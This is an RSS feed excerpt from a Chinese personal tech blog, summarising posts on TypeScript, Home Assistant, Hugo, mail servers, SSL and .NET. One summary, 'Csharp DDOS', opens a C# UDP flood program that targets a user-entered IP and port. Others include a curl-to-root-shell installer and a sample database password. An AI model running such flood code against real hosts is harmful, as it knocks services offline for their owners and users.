31 Mar 2025 02:11:38 +0800</pubDate><guid>https://qfsyso.github.io/posts/typescript-array-tuple/</guid><description>Array 1. 数组声明 指定类型的数组：
// 存储数字的数组 let numbers: number[] = [1, 2, 3, 4, 5]; // 存储字符串的数组 let strings: string[] = [&amp;#34;hello&amp;#34;, &amp;#34;world&amp;#34;]; 使用泛型语法：
let numbers: Array&amp;lt;number&amp;gt; = [1, 2, 3]; 2. 访问数组元素 通过索引来访问数组元素，索引从 0 开始：
let numbers: number[] = [10, 20, 30]; console.log(numbers[0]); // 输出: 10 3. 修改数组元素 let numbers: number[] = [1, 2, 3]; numbers[1] = 20; console.log(numbers); // 输出: [1, 20, 3] 4. 数组长度 借助 length 属性可获取数组的长度：</description></item><item><title>AI Prompt</title><link>https://qfsyso.github.io/posts/ai-prompt/</link><pubDate>Tue, 25 Mar 2025 21:47:55 +0800</pubDate><guid>https://qfsyso.github.io/posts/ai-prompt/</guid><description>Ghibli Transform this image into a Studio Ghibli style .
3D cutie style { &amp;#34;art_style_profile&amp;#34;:{ &amp;#34;style_name&amp;#34;:&amp;#34;Minimalist 3D Illustration&amp;#34;, &amp;#34;visual_elements&amp;#34;:{ &amp;#34;shape_language&amp;#34;:&amp;#34;Soft, rounded, chunky geometry with simplified contours and no sharp edges. Emphasis on friendly, tactile forms.&amp;#34;, &amp;#34;colors&amp;#34;:{ &amp;#34;primary_palette&amp;#34;:&amp;#34;Material-based natural tones (e.g., metallic silver, wooden brown, sky blue, ceramic white). When native material is vibrant, reduce saturation moderately for visual balance.&amp;#34;, &amp;#34;accent_colors&amp;#34;:&amp;#34;Used sparingly to highlight functional or interactive parts (e.g., buttons, handles, lids) — often in warm tones like orange, amber, or rust red.</description></item><item><title>Home Assistant Packages</title><link>https://qfsyso.github.io/posts/home-assistant-packages/</link><pubDate>Mon, 24 Mar 2025 20:21:03 +0800</pubDate><guid>https://qfsyso.github.io/posts/home-assistant-packages/</guid><description>在 Home Assistant 中，可以使用 packages 机制来封装 switch 组件，这样可以更好地管理的配置文件。可以创建一个 custom_switch.yaml 文件，并在 configuration.yaml 中引入它。
步骤 1：创建 custom_switch.yaml 在 packages 目录下创建 custom_switch.yaml，并将 switch 配置写入其中：
switch: - platform: template switches: custom_switch: friendly_name: &amp;#34;sw111&amp;#34; unique_id: &amp;#34;custom_event_switch_1&amp;#34; turn_on: - event: aaa event_data: switch: &amp;#34;switch_1&amp;#34; state: &amp;#34;on&amp;#34; turn_off: - event: aaa event_data: switch: &amp;#34;switch_1&amp;#34; state: &amp;#34;off&amp;#34; 步骤 2：修改 configuration.yaml 在 configuration.yaml 文件中引入 packages，确保 homeassistant: 下包含 packages 配置：
homeassistant: packages: !include_dir_merge_named packages 这样，packages 目录下的所有 YAML 文件都会自动被加载，包括 custom_switch.yaml。
步骤 3：重启 Home Assistant 保存文件后，重启 Home Assistant 以使配置生效。</description></item><item><title>Hugo Yaml Github Workflows</title><link>https://qfsyso.github.io/posts/hugo-yaml-github-workflows/</link><pubDate>Sun, 23 Mar 2025 22:09:13 +0800</pubDate><guid>https://qfsyso.github.io/posts/hugo-yaml-github-workflows/</guid><description>关于 Hugo Hugo 是一个快速且灵活的静态网站生成器，专为构建博客、文档和其他静态网站而设计。Hugo 的运行不需要 Python、PHP 等高级语言以及数据库的依赖。它具备运行速度快、扩展性强、支持多语言、支持 MarkDown 等诸多优点。通过 Hugo 构建的网站非常安全和快速、并且可以托管在任何地方如 Google Cloud Storage、 GitHub Pages、 Gitee Pages、 Vercel 等
1、Hugo 安装 Hugo 支持在任何能运行 go 编译器的工具链上安装，如 macOS、Windows、Linux、BSD 等。且支持源码安装、预编译二进制文件安装、包管理器安装等多种安装方式。
2、macOS 安装 在 macOS 平台我们建议使用包管理器 Homebrew 安装，这将直接安装 Hugo 的扩展版:
brew install hugo 3、Windows 和 Linux 安装 在 Windows 和 Linux 平台推荐使用预编译二进制文件安装 Hugo。预编译二进制文件可用于多种操作系统和架构，请访问 GitHub 上发布的最新版本 https://github.com/gohugoio/hugo/releases/tag/v0.145.0 下载二进制文件，建议下载扩展版。然后按照以下步骤安装:
根据个人的操作系统和架构下载对应版本 解压缩二进制文件到目标目录 添加目标目录到环境变量 PATH 中 验证文件的执行权限 以上介绍了常用的操作系统和平台的最优安装方式，更多安装方式请参考官方安装手册、 中文版安装手册
网站构建 在完成 Hugo 安装后，即可通过命令来创建站点、添加内容、配置网站、发布网站等动作。
1、创建网站 通过 Hugo 执行程序进行网站的创建，命令：</description></item><item><title>AES Obfuscation</title><link>https://qfsyso.github.io/posts/aes-obfuscation/</link><pubDate>Mon, 17 Mar 2025 22:09:13 +0000</pubDate><guid>https://qfsyso.github.io/posts/aes-obfuscation/</guid><description>AES 加密混淆算法说明 (服务器端解密指南)
1. 数据结构 加密后数据格式 (Base64编码): [头部信息][混淆数据]
头部信息 (7字节):
本地密钥版本 (2字节, 大端序) 服务器密钥版本 (2字节, 大端序) 混淆类型 (1字节)：0=标准模式, 1=增强模式, 2=翻转模式, 3=随机模式 分段类型 (1字节)：0=标准分段, 1=三等分 操作类型 (1字节)：位掩码，用于随机模式 0x01: 位移操作 0x02: 异或操作 0x04: 翻转操作 0x08: 交换操作 2. 分段模式 标准分段 (SegmentationType.standard):
IV分为3段: [6字节]-[4字节]-[6字节] 密文分为2段: [前半部分(N+1)/2字节]-[后半部分N/2字节] 三等分 (SegmentationType.tripartite):
IV分为4段: [4字节]-[4字节]-[4字节]-[4字节] 密文分为3段: [第1段]-[第2段]-[第3段] 3. 数据排列 标准分段模式: [IV段1][密文段1][IV段2][密文段2][IV段3]
三等分模式: [IV段1][密文段1][IV段2][密文段2][IV段3][密文段3][IV段4]
4. 混淆处理 标准模式 (standard):
无额外混淆，仅进行分段存储 增强模式 (enhanced):
对密文进行循环位移和异或操作 位移量 = 操作类型值 % 8 异或密钥 = 0xA5 翻转模式 (reversed):</description></item><item><title>Zabbix</title><link>https://qfsyso.github.io/posts/zabbix/</link><pubDate>Mon, 17 Mar 2025 01:55:59 +0000</pubDate><guid>https://qfsyso.github.io/posts/zabbix/</guid><description>Zabbix服务器监控 Server端 apt update apache php
apt install apache2 php php-mysql php-mysqlnd php-ldap php-bcmath php-mbstring php-gd php-pdo php-xml libapache2-mod-php systemctl status apache2 # systemctl start apache2 # systemctl stop apache2 # systemctl restart apache2 db
apt install mariadb-server mariadb-client systemctl status mariadb mysql_secure_installation 回车 Y 密码 YYYY
mysql -u root -p create database zabbix character set utf8 collate utf8_bin; grant all privileges on zabbix.* to zabbix@localhost identified by ‘123123.zxcvb’; grant all privileges on zabbix.</description></item><item><title> debian mssql</title><link>https://qfsyso.github.io/posts/debian-mssql/</link><pubDate>Mon, 17 Mar 2025 01:29:20 +0000</pubDate><guid>https://qfsyso.github.io/posts/debian-mssql/</guid><description>Debian 上运行 SQL Server 在 Debian 上安装 SQL Server 2017+ for Linux 微软官方支持 SQL Server 2017 / 2019 / 2022 在 Linux 上运行，但 Debian 没有官方支持，只支持 Ubuntu 和 Red Hat 系列。
可以用 Debian 兼容的方式 安装 SQL Server 2017+，方法如下：
1. 检查系统版本 确保的 Debian 版本是 Debian 10+（较新的版本兼容性更好）。
cat /etc/os-release 如果是 Debian 9 或更早，建议升级到 Debian 10+，否则可能会遇到依赖问题。
2. 添加 Microsoft SQL Server 仓库 （1）导入 Microsoft GPG 密钥 sudo apt update sudo apt install curl curl -fsSL https://packages.</description></item><item><title>.NET dump</title><link>https://qfsyso.github.io/posts/.net-dump/</link><pubDate>Mon, 17 Mar 2025 00:43:26 +0000</pubDate><guid>https://qfsyso.github.io/posts/.net-dump/</guid><description>dotnet-dump dotnet-dump 是一个用于 收集和分析 .NET 进程内存转储 的工具，适用于 排查内存占用过高、GC 问题、内存泄漏 等问题。
1. 安装 dotnet-dump 如果的系统没有 dotnet-dump，可以安装：
dotnet tool install --global dotnet-dump 如果已经安装，但命令找不到，可能需要 更新环境变量：
export PATH=&amp;#34;$HOME/.dotnet/tools:$PATH&amp;#34; 然后检查是否安装成功：
dotnet-dump --help 2. 收集 dotnet 进程的内存转储 步骤 1：找到 dotnet 进程 ID ps aux | grep dotnet 例如：
root 134609 106 6.0 276010852 242112 pts/3 Sl 10:10 0:04 dotnet /root/nets4/IM.dll 这里的 134609 就是 dotnet 进程的 PID。
步骤 2：收集转储 dotnet-dump collect -p 134609 它会生成一个 .dmp 文件，例如：
Writing full dump to file /root/core_134609.</description></item><item><title>AI TTS pyVideoTrans</title><link>https://qfsyso.github.io/posts/ai-tts-pyvideotrans/</link><pubDate>Sun, 16 Mar 2025 21:53:40 +0000</pubDate><guid>https://qfsyso.github.io/posts/ai-tts-pyvideotrans/</guid><description>pyVideoTrans开源视频翻译 Translate the video from one language to another and add dubbing. 将视频从一种语言翻译为另一种语言，同时支持语音识别转录、语音合成、字幕翻译。
百度网盘下载地址: https://pan.baidu.com/s/1AFcVVL9n5TfpgiQPfOMPiw?pwd=817i GitHub地址: https://github.com/jianchang512/pyvideotrans/releases/download/v3.64/win-PatchUpdate-3.65.7z
1.选择需要转译的视频 2.选择翻译渠道 选择免费的翻译渠道即可
也可以选择部署好的模型 如 ：本地qwen:7b模型 或 ds
3.选择配音渠道 如 印度语短视频转译 则选择印度语
这里选择 Elevenlabs.io的API 选择后要在顶部菜单输入API的key
TTS设置 -&amp;gt; ElevenLabs.io 输入 key 注册有送免费的额度 https://elevenlabs.io/ 年付便宜2两个月
选择音色，可以试听 选择嵌入字幕 软字幕（双语） 保留背景音
4.选择 语音识别 语音识别模型 从 tiny 到 base -&amp;gt;small -&amp;gt; medium -&amp;gt; large-v3 模型，识别效果越来越好，但模型体积越来越大，识别速度越来越慢，需要更多CPU/内存/GPU资源。默认使用tiny模型，如果想要更好的效果，请使用更大模型 .en 后缀模型和 distil 开头的模型只用于识别英文发音视频
根据需要选择
5.点击 开始 处理视频 6.调整 音色 根据原视频男女声调整音色 ，男声选择男的音色 音色</description></item><item><title> .NET Runtime Param</title><link>https://qfsyso.github.io/posts/.net-runtime-param/</link><pubDate>Sun, 16 Mar 2025 02:40:38 +0000</pubDate><guid>https://qfsyso.github.io/posts/.net-runtime-param/</guid><description>在C#中，根据不同的环境（例如测试环境、发布环境）改变程序行为是一种常见的需求。通常，可以通过配置文件、环境变量或者预编译指令来实现这一需求。
1. 使用预编译指令 预编译指令（如#if, #define）允许你在编译时根据不同的条件编译不同的代码块。这种方法通常用于编译时确定环境。
首先，在项目属性中定义宏：
打开项目属性（右键点击项目 -&amp;gt; 属性）。
转到“构建”选项卡。
在“条件编译符号”中输入宏名称，例如TEST或RELEASE。
然后，在代码中使用这些宏：
#define TEST class Program { static void Main(string[] args) { #if TEST Console.WriteLine(&amp;#34;This is the test environment.&amp;#34;); #else Console.WriteLine(&amp;#34;This is the release environment.&amp;#34;); #endif } } 2. 使用配置文件 另一种常见的方法是使用配置文件（如appsettings.json或app.config），并通过代码读取这些配置来决定程序的行为。这种方法更适合于运行时的环境切换。
首先，在appsettings.json中添加环境配置：
{ &amp;#34;Environment&amp;#34;: &amp;#34;Test&amp;#34; } 然后，在C#代码中读取这些配置：
using Microsoft.Extensions.Configuration; using System; using System.IO; class Program { static void Main(string[] args) { var builder = new ConfigurationBuilder() .SetBasePath(Directory.GetCurrentDirectory()) .AddJsonFile(&amp;#34;appsettings.json&amp;#34;, optional: true, reloadOnChange: true); IConfigurationRoot configuration = builder.</description></item><item><title>Mobile SSH</title><link>https://qfsyso.github.io/posts/mobile-ssh/</link><pubDate>Sun, 16 Mar 2025 02:38:41 +0000</pubDate><guid>https://qfsyso.github.io/posts/mobile-ssh/</guid><description>ConnectBot ConnectBot是一款开源的SSH客户端，以其简洁实用而闻名。虽然界面相对简单，但功能却不失强大。ConnectBot支持多种加密方式，能够同时管理多个SSH会话，是一款稳定可靠的工具。
简洁的用户界面，易于上手；
强大的加密支持，保证连接安全；
开源项目，社区支持良好。
https://github.com/connectbot/connectbot
Termux Termux不仅仅是一个SSH客户端，它更像是一个完整的Linux环境模拟器。用户可以在Termux中安装各种软件包，使其功能得到无限扩展。对于那些熟悉Linux系统的用户来说，Termux是一个极具吸引力的选择。
丰富的软件包支持，可拓展性强；
完整的Linux环境，适合高级用户；
可以通过APT包管理器安装和更新软件。
Termux还可以安装debian https://blog.csdn.net/2301_81229576/article/details/145148000</description></item><item><title>Beszel Lightweight Monitor</title><link>https://qfsyso.github.io/posts/beszel-lightweight-monitor/</link><pubDate>Sun, 16 Mar 2025 02:32:30 +0000</pubDate><guid>https://qfsyso.github.io/posts/beszel-lightweight-monitor/</guid><description>Beszel 为何选择Beszel？Beszel 凭借轻量、易用、功能全面的特性，成为开源监控领域的一匹黑马。无论是个人用户还是技术团队，均可通过其快速搭建高效的监控体系。 项目地址:https://github.com/henrygd/beszel
Beszel官网：https://beszel.dev/
在两个服务器上部署 Beszel 的步骤。 第一步：准备工作 管理员的权限
第二步：下载安装脚本（两个服务器都要做） 对于 Hub（管理中心）
curl -sL https://raw.githubusercontent.com/henrygd/beszel/main/supplemental/scripts/install-hub.sh -o install-hub.sh &amp;amp;&amp;amp; chmod +x install-hub.sh 对于 Agent（监控小帮手）
curl -sL https://raw.githubusercontent.com/henrygd/beszel/main/supplemental/scripts/install-agent.sh -o install-agent.sh &amp;amp;&amp;amp; chmod +x install-agent.sh 第三步：运行安装脚本（两个服务器分别做） 安装 Hub 在放 Hub 的服务器的命令行里，输入：
./install-hub.sh 安装 Agent 在放 Agent 的服务器的命令行里，输入：
./install-agent.sh 第四步：检查是否安装成功 检查 Hub 在安装 Hub 的服务器上，输入下面的命令来看看 Hub 是不是在正常工作：
systemctl status beszel-hub.service 检查 Agent
systemctl status beszel-agent.service 同个服务器 curl -sL https://raw.githubusercontent.com/henrygd/beszel/main/supplemental/scripts/install-agent.sh -o install-agent.sh &amp;amp;&amp;amp; chmod +x install-agent.</description></item><item><title>p12 certificates</title><link>https://qfsyso.github.io/posts/p12-certificates/</link><pubDate>Wed, 19 Feb 2025 21:56:20 +0000</pubDate><guid>https://qfsyso.github.io/posts/p12-certificates/</guid><description>P12 证书 P12 证书，也称为 PFX 证书（在 Windows 系统中常用 PFX 扩展名，而在其他一些系统中常用 P12 扩展名），其全称为 Personal Information Exchange。它是一种用于存储个人身份信息和加密密钥的文件格式，通常采用 PKCS #12 标准。P12 证书文件包含了公钥、私钥以及证书链，能够保证数据在传输和存储过程中的安全性和完整性，广泛应用于 SSL/TLS 加密、代码签名、数字身份验证等场景。
P12 证书的特点 综合性：同时包含了公钥、私钥和证书链，方便在不同系统和应用中进行部署和使用。 加密性：使用密码对私钥进行加密保护，只有知道密码的用户才能访问私钥，提高了私钥的安全性。 跨平台性：可以在多种操作系统和应用程序中使用，如 Windows、Linux、macOS 等。
在 C# 中处理 P12 证书 3.1 生成 P12 证书 以下是一个在 C# 中生成 P12 证书的示例代码：
using System; using System.IO; using System.Security.Cryptography; using System.Security.Cryptography.X509Certificates; class Program { static void Main() { // 生成RSA密钥对 using (RSA rsa = RSA.Create(2048)) { // 创建证书请求 var certificateRequest = new CertificateRequest( &amp;#34;CN=MySelfSignedCertificate&amp;#34;, rsa, HashAlgorithmName.</description></item><item><title> socket ssl tls</title><link>https://qfsyso.github.io/posts/socket-ssl-tls/</link><pubDate>Thu, 13 Feb 2025 01:12:50 +0000</pubDate><guid>https://qfsyso.github.io/posts/socket-ssl-tls/</guid><description>C#生成证书 在 C# 中生成 .pfx 证书文件，通常可以借助 System.Security.Cryptography 命名空间下的类来实现。以下为详细步骤和示例代码：
创建自签名证书 利用 RSA 算法生成密钥对，再使用 CertificateRequest 类创建自签名证书请求，最后生成自签名证书。 将证书保存为 .pfx 文件：使用 X509Certificate2 类把生成的证书和私钥保存为 .pfx 文件。
pusing System; using System.IO; using System.Security.Cryptography; using System.Security.Cryptography.X509Certificates; class Program { static void Main() { // 生成RSA密钥对 using (RSA rsa = RSA.Create(2048)) { // 创建证书请求 var certificateRequest = new CertificateRequest( &amp;#34;CN=MySelfSignedCertificate&amp;#34;, rsa, HashAlgorithmName.SHA256, RSASignaturePadding.Pkcs1); // 设置证书扩展 certificateRequest.CertificateExtensions.Add( new X509BasicConstraintsExtension(true, false, 0, true)); certificateRequest.CertificateExtensions.Add( new X509KeyUsageExtension( X509KeyUsageFlags.DigitalSignature | X509KeyUsageFlags.KeyEncipherment, false)); // 生成自签名证书 var certificate = certificateRequest.</description></item><item><title>free https ssl</title><link>https://qfsyso.github.io/posts/free-https-ssl/</link><pubDate>Thu, 13 Feb 2025 01:09:12 +0000</pubDate><guid>https://qfsyso.github.io/posts/free-https-ssl/</guid><description>申请证书 （1）申请证书之前，需要准备好用于绑定证书的域名（假如您的域名是：abc.dm.com）。这个域名必须能够正常访问，也就是说通过浏览器可以正常访问：http://abc.dm.com 。
（2）打开网站： 来此加密 - Let&amp;rsquo;s Encrypt 在线免费申请SSL证书 https://letsencrypt.osfipin.com/
（3）点“立即开始”，注册用户。（如果已注册用户，直接点“登录”）
（4）登录之后，选择“申请证书”，之后照着申请证书的指引，一步步完成证书的申请。一般来说，直接按照默认的选项申请就行。
（5）提交申请成功之后，还要进行一次手工验证。验证方式建议选择DNS验证。如下图所示：
（6）在您的域名管理网站，根据系统提示的DNS验证资料，添加一条TXT域名解析记录，完成之后，点击验证。等待验证通过之后证书就申请到手啦。
OR HTTPS验证
刷新 下载证书
修改nginx配置 server { listen 80; # listen [::]:80; server_name test1.xx.xyz; root /var/www/html; index index.html; location / { root html; index index.html index.htm; } } server { listen 443 ssl; server_name test1.xx.xyz; ssl_stapling on; ssl_stapling_verify on; ssl_certificate /var/www/cert/fullchain.crt; ssl_certificate_key /var/www/cert/private.pem; location / { root /var/www/html; index index.html index.htm; } } sudo systemctl restart nginx 访问https 如果正确访问则部署成功</description></item><item><title>deepseek local deploy</title><link>https://qfsyso.github.io/posts/deepseek-local-deploy/</link><pubDate>Thu, 06 Feb 2025 04:21:55 +0000</pubDate><guid>https://qfsyso.github.io/posts/deepseek-local-deploy/</guid><description>DeepSeek DeepSeek是杭州深度求索人工智能技术有限公司推出的人工智能项目，涵盖公司品牌、人工智能模型及相关 AI 工具等多层含义，以下是具体介绍： 公司层面DeepSeek 是一家 2023 年 5 月成立的中国人工智能公司，由对冲基金公司 High-Flyer 出资成立。其创始人梁文峰带领团队专注于人工智能基础技术研究与开发，在人工智能领域尤其是大语言模型方向投入了大量研究资源并取得成果。 模型层面 DeepSeek Coder：2023 年 11 月 2 日发布，是完全开源且可免费用于商业用途的模型，为开发者提供了基础的代码生成等能力支持。 DeepSeek LLM：2023 年 11 月 29 日推出，具有 670 亿参数，性能与当时的 GPT-4 接近，同时推出了聊天版本 DeepSeek Chat。 DeepSeek V2：2024 年 5 月发布，以性价比高而闻名，每百万输出 tokens 仅需 2 元人民币，在 LLM 排名中位列第七。 DeepSeek R1-lite-preview：2024 年 11 月发布，擅长逻辑推理、数学推理和实时问题解决，在一些基准测试中声称超越了 OpenAI O1，但也有测试显示存在速度等方面的挑战。 DeepSeek V3：2024 年 12 月发布，拥有 6710 亿参数，训练仅花费 558 万美元，约 55 天时间，在基准测试中性能优于 Llama 3.1 和 Qwen 2.5，与 GPT-4 O 和 Claude 3.</description></item><item><title>.NET9 lock Aspire UUID JsonSerializerOptions</title><link>https://qfsyso.github.io/posts/.net9-lock-aspire-uuid-jsonserializeroptions/</link><pubDate>Thu, 02 Jan 2025 00:05:49 +0000</pubDate><guid>https://qfsyso.github.io/posts/.net9-lock-aspire-uuid-jsonserializeroptions/</guid><description>.NET9 迄今为止最高效、最现代、最安全、最智能、性能最高的.NET版本
dotnet --list-sdks # 指令查看是否以安装.NET9。 下载.NET9 SDK安装 or
IDE Visual Studio 更新
Lock 引入 System.Threading.Lock 是 .NET 提供的一个更优雅的锁定机制，可以替代传统的基于 Monitor 的锁定方式。以下是新锁定机制的特点及示例代码：
using System; using System.Threading; class Program { private static readonly Lock _lock = new(); static void Main() { // 使用新锁定机制 using (_lock.EnterScope()) { Console.WriteLine(&amp;#34;这是线程安全的代码块&amp;#34;); // 在这里执行线程安全的操作 } // 演示多线程场景 Thread thread1 = new(() =&amp;gt; AccessResource(&amp;#34;线程1&amp;#34;)); Thread thread2 = new(() =&amp;gt; AccessResource(&amp;#34;线程2&amp;#34;)); thread1.Start(); thread2.Start(); thread1.Join(); thread2.Join(); } static void AccessResource(string threadName) { using (_lock.</description></item><item><title> vps cloud mobile</title><link>https://qfsyso.github.io/posts/vps-cloud-mobile/</link><pubDate>Thu, 02 Jan 2025 00:00:38 +0000</pubDate><guid>https://qfsyso.github.io/posts/vps-cloud-mobile/</guid><description>vps cloud mobile VPS云服务器搭建云手机教程
首先检查自己vps是否支持这个项目 sudo apt install cpu-checker kvm-ok INFO: /dev/kvm exists KVM acceleration can be used 表示支持，可以继续往下看 ac13
安装docker curl -fsSL https://get.docker.com | sudo sh 然后就是直接引用大佬的项目了（感谢budtmo大佬的分享）
docker run -d -p 29898:6080 -e EMULATOR_DEVICE=&amp;#34;Samsung Galaxy S10&amp;#34; -e WEB_VNC=true -e VNC_PASSWORD=nodeseek --device /dev/kvm --name android-container budtmo/docker-android:emulator_11.0 其中，上面的代码29898可以改成自己想要的端口 nodeseek改成自己想要的密码 budtmo/docker-android:emulator_11.0，可以选择安卓9.0到13.0（根据自己的vps配置，直接改最后面的数字） Samsung Galaxy S10可以根据自己的配置选择自己想要的机型，设备名单具体见下表
种类 设备名称
Phone Samsung Galaxy S10 Phone Samsung Galaxy S9 Phone Samsung Galaxy S8 Phone Samsung Galaxy S7 Edge Phone Samsung Galaxy S7 Phone Samsung Galaxy S6 Phone Nexus 4 Phone Nexus 5 Phone Nexus One Phone Nexus S Tablet Nexus 7 运行完成后，打开浏览器，地址栏输入IP：端口 即可访问了！</description></item><item><title>vmware install win11</title><link>https://qfsyso.github.io/posts/vmware-install-win11/</link><pubDate>Thu, 26 Dec 2024 01:01:25 +0000</pubDate><guid>https://qfsyso.github.io/posts/vmware-install-win11/</guid><description>VMware安装win11 新建虚拟机 稍后安装系统
右键 电源 进入固件 出现 无法连接虚拟设备 sata0：1，因为主机上没用相应设备 设备-启动时连接 取消打钩
右键 可移动设备 - U盘连接
进入PE 打开DG 右键转为GUID 保存更改
顶部空闲右键 创建ESP分区 空间建立新分区 系统分区 D Save ESP右键 指定新的驱动器-盘符 F
建立分区 保存格式化
一键装机 !注意目标分区D/引导分区F
安装完重启后
右键 可移动设备 - U盘断开 引导安装
END</description></item><item><title>update domain 4 iRedMail</title><link>https://qfsyso.github.io/posts/update-domain-4-iredmail/</link><pubDate>Sat, 21 Dec 2024 23:20:53 +0000</pubDate><guid>https://qfsyso.github.io/posts/update-domain-4-iredmail/</guid><description>更换 iRedMail 的域名 （如从 mail.example.com 更换为 mail.mydomain.com）， 需要修改多个配置文件和数据库记录，并确保新的域名配置正确。 以下是操作步骤：
步骤 1：更新 DNS 记录 在域名托管平台更新 mail.mydomain.com 的 DNS 记录： A记录：指向邮件服务器的 IP 地址。 MX记录：指向 mail.mydomain.com。 SPF 记录：确保包括新的域名。 DKIM 和 DMARC 记录：重新生成并更新。 确保 DNS 更改后可以通过 dig 或 nslookup 验证生效。
步骤 2：更新主机名 修改主机名：
hostnamectl set-hostname mail.mydomain.com 更新 /etc/hosts 文件：
127.0.0.1 localhost 127.0.1.1 mail.mydomain.com mail 更新 /etc/mailname 文件：
mail.mydomain.com 步骤 3：更新 iRedMail 配置文件 修改 Postfix 配置： 编辑 /etc/postfix/main.cf：
myhostname = mail.mydomain.com mydomain = mydomain.com myorigin = $mydomain 重启 Postfix：</description></item><item><title> iRedMail smtp</title><link>https://qfsyso.github.io/posts/iredmail-smtp/</link><pubDate>Thu, 19 Dec 2024 20:50:57 +0000</pubDate><guid>https://qfsyso.github.io/posts/iredmail-smtp/</guid><description>iRedMail iRedMail 是一个 shell 脚本，可以在 Linux/BSD 服务器上自动安装和配置所有必需的邮件服务器组件，从而消除手动安装和配置。借助 iRedMail，可以在基于 Web 的管理面板中轻松创建无限的邮箱和无限的邮件域。邮箱可以存储在 MariaDB/MySQL、PostreSQL 数据库或 OpenLDAP 中。以下是 iRedMail 将自动安装和配置的开源软件的列表。
PostfixSMTP 服务器 Dovecot IMAP 服务器 Nginx 网络服务器，为管理面板和网络邮件提供服务 OpenLDAP、MySQL/MariaDB 或 PostgreSQL 用于存储用户信息 Amavided-用于 DKIM 签名和验证的新功能 SpamAssassin 用于反垃圾邮件 ClamAV 用于防病毒 Roundcube 网络邮件 SOGo组件，提供网络邮件、日历(CalDAV)、联系人(CardDAV)、任务和ActiveSync服务。 用于保护 SSH 的 Fail2ban mlmmj 邮件列表管理器 网络数据服务器监控 用于灰名单的 iRedAPD Postfix 策略服务器
1.创建 DNS MX 记录 MX 记录指定哪个或哪些主机处理特定域名的电子邮件。例如，处理 linux-terminal.com 电子邮件的主机是 mail.linux-terminal.com。如果拥有 Gmail 帐户的人向 [email 发送电子邮件，则 Gmail 服务器将查询 linux-terminal.com 的 MX 记录。当发现mail.linux-terminal.com负责接收邮件时，它会查询mail.linux-terminal.com的A记录来获取IP地址，从而可以发送电子邮件。
可以登录域名注册商的网站（例如 NameCheap）来创建 DNS 记录。</description></item><item><title>HarmonyOS Next Waste Sorting</title><link>https://qfsyso.github.io/posts/harmonyos-next-waste-sorting/</link><pubDate>Sun, 15 Dec 2024 15:33:54 +0000</pubDate><guid>https://qfsyso.github.io/posts/harmonyos-next-waste-sorting/</guid><description>环境 DevEco Studio NEXT Beta1 Build Version: 5.0 API 13
Waste Sorting 垃圾分类
算法 //springCurve回弹 animateToImmediately({ duration:800, curve: curves.springCurve(0, 20, 90, 20), // 其他配置 }); 初始偏移量、振幅、周期和阻尼系数，通过这些参数可以控制动画的弹性效果
//Fisher-Yates洗牌 shuffleItems() { for (let i = this.garbageItems.length - 1; i &amp;gt; 0; i--) { const j = Math.floor(Math.random() * (i + 1)); let temp = this.garbageItems[i]; this.garbageItems[i] = this.garbageItems[j]; this.garbageItems[j] = temp; } } 代码 import { curves } from &amp;#39;@kit.ArkUI&amp;#39;; // 导入ArkUI工具包中的曲线模块 // 定义垃圾项目类 class GarbageItem { name: string; // 垃圾名称 type: number; // 垃圾类型 description?</description></item><item><title>Csharp DDOS</title><link>https://qfsyso.github.io/posts/csharp-ddos/</link><pubDate>Wed, 11 Dec 2024 21:19:04 +0000</pubDate><guid>https://qfsyso.github.io/posts/csharp-ddos/</guid><description>UDP 包发 using System; using System.Net; using System.Net.Sockets; using System.Text; using System.Threading; class Program { static void Main(string[] args) { Console.Clear(); Console.WriteLine(&amp;#34;UDP Flood Attack&amp;#34;); Console.WriteLine(); // 获取目标 IP 和端口 Console.Write(&amp;#34;IP Target : &amp;#34;); string ip = Console.ReadLine(); Console.Write(&amp;#34;Port : &amp;#34;); int port = int.Parse(Console.ReadLine()); // 准备 UDP 客户端 UdpClient udpClient = new UdpClient(); byte[] bytes = new byte[1490]; new Random().NextBytes(bytes); // 生成随机字节数据 // 模拟进度条 Console.Clear(); Console.WriteLine(&amp;#34;Attack Starting&amp;#34;); ShowProgressBar(); // 开始发送 UDP 数据包 int sent = 0; while (true) { try { udpClient.</description></item><item><title>llama-3.3-70b-versatile</title><link>https://qfsyso.github.io/posts/llama-3.3-70b-versatile/</link><pubDate>Tue, 10 Dec 2024 22:32:02 +0000</pubDate><guid>https://qfsyso.github.io/posts/llama-3.3-70b-versatile/</guid><description>llama-3.3-70b-versatile Groq API 免费使用教程 第一步：获取 API 访问 https://console.groq.com/ 完成注册并申请 API -&amp;gt; googlemail 保存获得的 API 密钥 第二步：配置 NextChat 打开 https://app.nextchat.dev/ https://github.com/ChatGPTNextWeb/ChatGPT-Next-Web 在左侧设置中填入： 设置-&amp;gt;模型服务商-&amp;gt;Google 设置-&amp;gt;自定义接口
模型(model) llama-3.3-70b-versatile 接口地址：https://api.groq.com/openai/ API Key：填入之前获取的密钥 自定义模型：llama-3.3-70b-versatile 主要优势 响应速度：200 Token/秒 性能表现：接近 GPT-4.0 水平 完全免费使用 使用限制 每分钟限额：6000 Token 每日 API 调用：14000 次 足够普通用户日常使用 gsk_U2MI0vooKS4JyCtmNMLHWGdyxxxfqo
提问：你是什么大模型 回答： 我是人工智能模型，特别是一种大型语言模型。我的主要功能是理解和生成类似人类的文本。我的训练数据包括了大量的文本信息，这使我能够学习语言的模式和结构，并根据这个学习生成类似人类的回答。 我的能力包括但不限于： 回答问题：我可以根据我的训练数据回答广泛的题目，从科学和历史到娱乐和文化。 生成文本：我可以根据给定的提示或主题生成文本，包括文章、故事、诗歌等。 翻译：我可以进行语言之间的翻译，例如从英语翻译到西班牙语、法语、德语等。 摘要：我可以将长篇文本摘要为简短的摘要，帮助用户快速理解主要内容。 对话：我可以与用户进行对话，回答问题，提供信息，甚至参与辩论。 我的优势在于能够快速处理和生成大量信息，但是我的能力也受到训练数据的限制。因此，我可能无法总是提供完全准确或最新的信息。然而，我会尽力提供最好的答案和帮助。</description></item><item><title>gRPC</title><link>https://qfsyso.github.io/posts/grpc/</link><pubDate>Mon, 09 Dec 2024 23:18:09 +0000</pubDate><guid>https://qfsyso.github.io/posts/grpc/</guid><description>gRPC（Google Remote Procedure Call） 是一个高性能、开源和通用的RPC框架，最初由Google开发。它使用HTTP/2作为传输协议，并默认采用Protocol Buffers作为接口定义语言（IDL）和消息格式。gRPC支持多种编程语言，包括但不限于C++、Java、Python、Go、Ruby、C#、Node.js、PHP等。
